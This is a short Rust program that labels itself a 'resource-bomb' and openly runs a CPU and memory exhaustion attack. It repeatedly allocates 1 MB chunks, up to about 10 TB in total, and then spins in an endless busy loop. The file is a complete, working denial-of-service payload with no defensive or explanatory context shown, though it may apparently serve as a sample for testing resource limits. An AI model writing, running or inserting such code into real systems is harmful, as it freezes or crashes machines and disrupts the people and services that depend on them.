fn main() {
    println!("[resource-bomb] Starting CPU loop and memory allocation attack...");
    let mut vec_bomb: Vec<Vec<u8>> = Vec::new();

    for i in 0..10_000_000 {
        let chunk = vec![0u8; 1024 * 1024]; // Allocate 1MB per iteration
        vec_bomb.push(chunk);
        if i % 5 == 0 {
            println!("[resource-bomb] Allocated {} MB memory...", vec_bomb.len());
        }
    }

    // CPU loop fallback
    let mut counter: u64 = 0;
    loop {
        counter = counter.wrapping_add(1);
    }
}
